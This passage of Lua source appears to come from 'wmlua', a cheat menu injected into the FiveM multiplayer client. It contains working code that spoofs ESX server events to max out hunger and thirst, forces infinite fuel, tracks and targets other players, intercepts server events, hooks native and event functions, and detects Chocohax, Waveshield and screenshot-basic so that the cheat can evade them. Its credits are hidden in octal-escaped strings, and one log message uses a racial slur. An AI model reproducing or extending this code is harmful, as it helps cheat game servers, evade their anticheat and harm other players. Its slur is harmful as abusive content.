                    else
                        wmlua.V.MenuSelectedButton = #wmlua.T.MenuButtons
                    end

                elseif wmlua.F.PressedCTRL(0, 172) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then -- Up Key

                    if wmlua.V.MenuSelectedButton - 1 > 0 then
                        wmlua.V.MenuSelectedButton = wmlua.V.MenuSelectedButton - 1
                    else
                        wmlua.V.MenuSelectedButton = 1
                    end

                elseif wmlua.F.PressedCTRL(0, 191) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu and wmlua.N.Get_GameTimer() > wmlua.V.LastInputTime + 500 and not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.UseGTAInput"]].active then -- Enter

                    wmlua.F.ButtonPress() -- de problem here

                elseif wmlua.F.PressedCTRL(0, 314) and wmlua.F.HoldingCTRL(0, 21) then

                    wmlua.F.VISHeatSeek(false)

                elseif wmlua.F.PressedCTRL(0, 107) and wmlua.menu.v.drawmenu then

                    wmlua.menu.v.playerlist_scroll_cur = wmlua.menu.v.playerlist_scroll_cur + 16

                elseif wmlua.F.PressedCTRL(0, 108) and wmlua.menu.v.drawmenu then

                    wmlua.menu.v.playerlist_scroll_cur = wmlua.F.ClampInt(wmlua.menu.v.playerlist_scroll_cur - 16, 1, 99999999999, true)

                elseif wmlua.F.PressedCTRL(0, wmlua.S.menuKey) then -- MMB

                    wmlua.menu.v.drawmenu = not wmlua.menu.v.drawmenu
                    wmlua.V.KillTimer = wmlua.N.Get_GameTimer() + 1500
                    
                    if wmlua.menu.v.drawmenu then
                        wmlua.N.DisableWeaponInputs(true)
                    else
                        wmlua.N.DisableWeaponInputs(false)
                    end

                elseif wmlua.F.HoldingCTRL(0, wmlua.S.menuKey) then

                    if wmlua.V.KillTimer and wmlua.N.Get_GameTimer() > wmlua.V.KillTimer then

                        wmlua.F.Unload_wmlua()

                    end

                elseif not wmlua.F.HoldingCTRL(0, wmlua.S.menuKey) then
                    wmlua.V.KillTimer = nil
                end

                if wmlua ~= nil and wmlua.T.MenuTabs and wmlua.menu.v.drawmenu then
                    if wmlua.V.MenuSelectedTab < 1 then
                        wmlua.V.MenuSelectedTab = #wmlua.T.MenuTabs
                    end
                    if wmlua.V.MenuSelectedTab > #wmlua.T.MenuTabs then
                        wmlua.V.MenuSelectedTab = 1
                        for i = 1, #wmlua.T.MenuTabs do

                            if wmlua.V.MenuSelectedTab == i then

                                wmlua.F.TabChange(wmlua.T.MenuTabs[i].name)

                            end

                        end
                    elseif wmlua.V.MenuSelectedTab < 1 then
                        wmlua.V.MenuSelectedTab = #wmlua.T.MenuTabs
                        for i = 1, #wmlua.T.MenuTabs do

                            if wmlua.V.MenuSelectedTab == i then

                                wmlua.F.TabChange(wmlua.T.MenuTabs[i].name)

                            end

                        end
                    end
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(125)

                if wmlua.V.OutFitIndex ~= 1 then
                    if wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed()) ~= wmlua.T.Outfits[wmlua.V.OutFitIndex].model then
                        wmlua.F.RequestMdl(wmlua.T.Outfits[wmlua.V.OutFitIndex].model)
                        wmlua.N.SetPlayerModel(wmlua.N.PlayerId(), wmlua.T.Outfits[wmlua.V.OutFitIndex].model)
                    end
                    SetPedHeadOverlay(wmlua.N.GetPlayerPed(), 2, 2, 1.0)
                    SetPedHeadOverlayColor(wmlua.N.GetPlayerPed(), 2, 1, 1, 1)
                    SetPedHeadBlendData(wmlua.N.GetPlayerPed(), 0,0,0, 0,0,0, 1,1,1, true)
                    for k,v in ipairs(wmlua.T.Outfits[wmlua.V.OutFitIndex].components) do
                        if v.type == 0 then
                            SetPedComponentVariation(wmlua.N.GetPlayerPed(), v.cid, v.drawid, v.textureid, v.paletteid)
                        elseif v.type == 1 then
                            if v.drawid > -1 then
                                SetPedPropIndex(wmlua.N.GetPlayerPed(), v.cid, v.drawid, v.textureid, v.attached)
                            else
                                ClearPedProp(wmlua.N.GetPlayerPed(), v.cid)
                            end
                        end
                    end
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- 1 S Loop

        while wmlua_Schleep ~= nil do wmlua_Schleep(math.random(900,1100))

            local _, error = wmlua_pcall(function() wmlua_Schleep(math.random(900,1100))

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_inffuel"]].active and wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) then

                    SetVehicleFuelLevel(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), 99.5)
                    wmlua.N.DecorSetFloat(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), "_FUEL_LEVEL", 99.5)
                    wmlua.N.DecorSetFloat(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), "_Fuel_Level", 99.5)

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.ESX_neverhungry"]].active then
                    wmlua_SendEvent(0, wmlua.V.ESX_neverhungry_event, 'hunger', 999999)
                    wmlua_SendEvent(0, wmlua.V.ESX_neverhungry_event, 'thirst', 999999)
                end
                
                wmlua.Playerlist_Players_t = {}
                wmlua.Playerlist_SIDS = {}

                for _, player in ipairs(wmlua.N.GetActivePlayers()) do

                    if wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(player)) == wmlua.N.GetHashKey("mp_f_freemode_01") then
                        wmlua.V.MQ = "F"
                    elseif wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(player)) == wmlua.N.GetHashKey("mp_m_freemode_01") then
                        wmlua.V.MQ = "M"
                    else
                        wmlua.V.MQ = wmlua.N.IsPedMale(wmlua.N.GetPlayerPed(player))

                        if wmlua.V.MQ then
                            wmlua.V.MQ = "M"
                        else
                            wmlua.V.MQ = "F"
                        end
                    end

                    wmlua.F.InsertToTable(wmlua.Playerlist_SIDS, wmlua.N.GetPlayerServerId(player))

                    if wmlua.T.TableContains(wmlua.T.FriendList, wmlua.N.GetPlayerServerId(player)) or player == wmlua.N.PlayerId() and not wmlua.T.TableContains(wmlua.T.TargetList, wmlua.N.GetPlayerServerId(player)) then
                        wmlua.F.InsertToTable(wmlua.Playerlist_Players_t, {dist = wmlua.N.CompareDistance(wmlua.F.GetDynamicPosition(), wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))), pid = wmlua.N.GetPlayerServerId(player), player = player, name = wmlua.N.GetPlayerName(player), ped = wmlua.N.GetPlayerPed(player), sex = wmlua.V.MQ, friend = true, target = false})
                    elseif wmlua.T.TableContains(wmlua.T.TargetList, wmlua.N.GetPlayerServerId(player)) then
                        wmlua.F.InsertToTable(wmlua.Playerlist_Players_t, {dist = wmlua.N.CompareDistance(wmlua.F.GetDynamicPosition(), wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))), pid = wmlua.N.GetPlayerServerId(player), player = player, name = wmlua.N.GetPlayerName(player), ped = wmlua.N.GetPlayerPed(player), sex = wmlua.V.MQ, friend = false, target = true})
                    else
                        wmlua.F.InsertToTable(wmlua.Playerlist_Players_t, {dist = wmlua.N.CompareDistance(wmlua.F.GetDynamicPosition(), wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))), pid = wmlua.N.GetPlayerServerId(player), player = player, name = wmlua.N.GetPlayerName(player), ped = wmlua.N.GetPlayerPed(player), sex = wmlua.V.MQ, friend = false, target = false})
                    end

                end

                wmlua.Playerlist_Players = {}
                wmlua.Playerlist_Closest_Players = {}

                for k,v in wmlua.F.spairs(wmlua.Playerlist_Players_t, function(t,a,b) return t[b].pid > t[a].pid end) do
                    wmlua.F.InsertToTable(wmlua.Playerlist_Players, v)
                end

                for k,v in wmlua.F.spairs(wmlua.Playerlist_Players_t, function(t,a,b) return t[b].dist > t[a].dist end) do
                    wmlua.F.InsertToTable(wmlua.Playerlist_Closest_Players, v)
                end

                for k,v in ipairs(wmlua.T.TargetList) do
                    if wmlua.T.TableContains(wmlua.Playerlist_SIDS, v) == false then
                        wmlua.F.EventLogInsert('[~b~WM~w~] Removed: ' .. wmlua.F.CleanString(v, "color") .. ' from target list, due to being inactive')
                        wmlua.T.TargetList[k] = nil
                    end
                end

                wmlua.T.peds = {}

                local pList = wmlua.N.GetEntList("CPed")
                for i = 1, #pList do
                    if wmlua.N.DoesEntityExist(pList[i]) and wmlua.N.GetEntityHealth(pList[i]) > 0 then
                        wmlua.F.InsertToTable(wmlua.T.peds, pList[i])
                    end
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    function wmlua.F.TabChange(tab)

        wmlua.T.MenuButtons = {}

        for k,v in ipairs(wmlua.T.Cheese) do
            if v.tab == tab then
                wmlua.V.mbopt = {tempval = v.tempval, realval = v.realval, optlist = v.optlist, ctrlType = v.ctrlType, bind = v.bind, name = v.name, label = v.label, func = v.func, efunc = v.efunc, MultiTarget = v.MultiTarget, Unsafe = v.Unsafe}
                wmlua.F.InsertToTable(wmlua.T.MenuButtons, wmlua.V.mbopt)
            end
        end

    end

    wmlua.V.fc = 0

    for k,v in ipairs(wmlua.T.Cheese) do
        wmlua.V.fc = wmlua.V.fc + 1
    end

    RegisterNetEvent("updatePlayers")
    AddEventHandler("updatePlayers", function(t) -- For the "busted" server, plan on creating features for this, information will be intercepted thru here.

        wmlua.F.DumpTable(t, true)

    end)

    AddEventHandler("gameEventTriggered", function(en, ea)
        
        if en == "CEventNetworkEntityDamage" and wmlua ~= nil and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_damagetoggle"]].active then
            local self = wmlua.F.CleanString(wmlua.N.GetPlayerName(wmlua.N.GetPlayerFromPed(wmlua.N.GetPlayerPed())), "color")
            local n1 = wmlua.F.CleanString(wmlua.N.GetPlayerName(wmlua.N.GetPlayerFromPed(ea[1])), "color")
            local n2 = wmlua.F.CleanString(wmlua.N.GetPlayerName(wmlua.N.GetPlayerFromPed(ea[2])), "color")
            if n1 == "**Invalid**" then n1 = "AI" end
            if n2 == "**Invalid**" then n2 = "AI" end
            if n1 == self or n2 == self then
                local allow = true
                if n2 == self then
                    if wmlua.N.IsEntityAPed(ea[1]) then
                        allow = true
                    else
                        allow = false
                    end
                end
                if allow then
                    local isFatal = ea[4]
                    local headshot = ea[9]
                    if isFatal == 1 then
                        isFatal = " ~r~Killed~s~ "
                    else
                        isFatal = " Damaged "
                    end
                    local elwep = ""
                    for k,v in pairs(wmlua.T.Weapons) do
                        if ea[5] == v.hash then
                            elwep = v.label
                        end
                    end
                    wmlua.F.EventLogInsert("[~b~WM~w~] " .. n2 .. isFatal .. n1)
                end
            end
        end

    end)

    wmlua.T.EventsToHide = {} 

    RegisterNetEvent(wmlua.API.wmEventLogger)
    AddEventHandler(wmlua.API.wmEventLogger, function(str)
        
        if wmlua and wmlua.V.LuaLSE then
            wmlua.V.ShowEvent = true
            for i = 1, #wmlua.T.EventsToHide do
                if string.find(string.lower(str), string.lower(wmlua.T.EventsToHide[i])) then
                    wmlua.V.ShowEvent = false
                end
            end
            if wmlua.V.ShowEvent then
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Lua_eventlogger_includeevents"]].active then
                    wmlua.F.EventLogInsert(str, 1000)
                end
                wmlua_print(str..'\n')
            end
        end

    end)

    RegisterNetEvent(wmlua.API.wmConfigRetriever)
    AddEventHandler(wmlua.API.wmConfigRetriever, function(p1)

        local checkFor = {'WMBeta','WMGang','MWClub'}
        local cfg = p1
        if cfg then
            for k,v in ipairs(checkFor) do
                if cfg:find(v) then cfg = cfg:gsub(v, "wmlua") end
            end
            if type(cfg) == "nil" then
                wmlua.F.EventLogInsert("[~r~WM~w~] Config doesn't exist")
            else
                if wmlua.V.ShowCFG then
                    wmlua_print(cfg)
                end
                local RetrievedCFG = json.decode(cfg)
                for k,v in pairs(RetrievedCFG) do
                    if k == "menu_cheese" then
                        local cheeseTable = v
                        for k2, v2 in ipairs(cheeseTable) do
                            for k3, v3 in ipairs(wmlua.T.Cheese) do
                                if wmlua.T.Cheese[k3].name == v2.name then
                                    wmlua.T.Cheese[k3].bind = v2.bind
                                    
                                end
                            end
                        end
                    elseif k == "SpamCars" then
                        wmlua.ST.SpamCars = v
                    elseif k == "SpamPeds" then
                        wmlua.ST.SpamPeds = v
                    elseif k == "SpamObjs" then
                        wmlua.ST.SpamObjs = v
                    elseif k == "SpamSfx" then
                        wmlua.ST.SpamSfx = v
                    else
                        if wmlua.V[k] ~= nil then wmlua.V[k] = v end
                        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V."..k]] ~= nil then wmlua.T.Cheese[wmlua.T.FI["wmlua.V."..k]].active = v end
                    end
                end
            end
        end

    end)

    AddEventHandler('onResourceStart', function (resourceName)
        wmlua.F.EventLogInsert("[~y~FiveM~w~] Resource: " .. resourceName .. " was started", 10000)
        local ssCheck = wmlua.N.LoadResourceFile(resourceName, 'dist/ui.html')
        if ssCheck and #ssCheck > 1 then
            if string.find(ssCheck, "Screenshot Helper", 1, true) then
                wmlua.F.EventLogInsert('[~r~WM~w~] Niggers started screenshot-basic in: ' .. resourceName, 30 * 1000)
            end
        end
    end)

    AddEventHandler('onResourceStop', function (resourceName)
        wmlua.F.EventLogInsert("[~y~FiveM~w~] Resource: " .. resourceName .. " was stopped", 10000)
    end)

    wmlua.H.WMInvokeNative(wmlua.STRINGS[56])

    wmlua_Thread(function()

        local _, error = wmlua_pcall(function() wmlua_Schleep(0)

            for i = 1, 5 do
                wmlua.N.FlashMinimap()
                wmlua_Schleep(750)
            end

        end)

        if error then
            error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
        end

    end)

    wmlua_Thread(function()

        wmlua.F.aim_buildFOV()
        
        wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active = true

        if CKgang or LOL or OnionUI then
            if not wmlua.I.ChocoFound then 
                wmlua.I.ChocoFound = true
                wmlua.F.EventLogInsert("[~b~WM~w~] Chocohax Anticheat found", 10000)
            end
        end

        local wavenotfound = true
        for k,v in pairs(_G) do
            if type(v) == "string" then
                if string.match(v,"waveshield") then
                    wavenotfound = false
                end
            end
        end
        
        if not wavenotfound then
            wmlua.F.EventLogInsert("[~b~WM~w~] Waveshield Anticheat found", 10000)
        end
        
        if t(wmlua.B) ~= "table" or t(wmlua.H) ~= "table" then
            wmlua.F.EventLogInsert("[~r~WM~w~] Loading issue, you should restart your game men.", 30 * 1000)
        end

        wmlua.F.EventLogInsert("[~g~WM~w~] \73\109\97\103\105\110\101\32\98\101\105\110\103\32\97\32\102\97\108\108\111\117\116\32\117\115\101\114\44\32\99\111\117\108\100\110\39\116\32\98\101\32\117\115\32\35\87\77\71\97\110\103", 30000)
        wmlua.F.EventLogInsert("[~o~WM~w~] \77\97\100\101\32\119\105\116\104\32\108\111\118\101\32\98\121\32\119\109\32\38\32\100\101\118\105\108", 30000)
        wmlua.F.EventLogInsert("[~b~WM~w~] \100\105\115\99\111\114\100\46\103\103\47\115\80\72\87\55\67\84\84\90\106", 30000)

        wmlua.V.MenuInitTime = wmlua.N.Get_GameTimer()

        wmlua.S.DesiredMenuKey = wmlua.F.GetInput("Enter Desired Menu Key")
        wmlua.S.DesiredMenuKey = tonumber(wmlua.S.DesiredMenuKey)

        if type(wmlua.S.DesiredMenuKey) == wmlua.STRINGS[53] then
            wmlua.F.EventLogInsert("[~b~WM~w~] Valid menu key, using custom value: " .. wmlua.S.DesiredMenuKey, 5 * 1000)
            wmlua.S.menuKey = wmlua.S.DesiredMenuKey
        else
            wmlua.S.menuKey = 348
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Menu Key, using default (Middle Mouse Button)", 10 * 1000)
        end
    
    end)

    wmlua_Schleep(10000)

    TriggerServerEventInternal = otse
    Citizen.InvokeNative = cin
    if not cotuwidzisz then CreateThread = wmlua_Thread Citizen.CreateThread = wmlua_Thread end

end)

end)


-- bäärs#3150
-- discord.gg/sPHW7CTTZj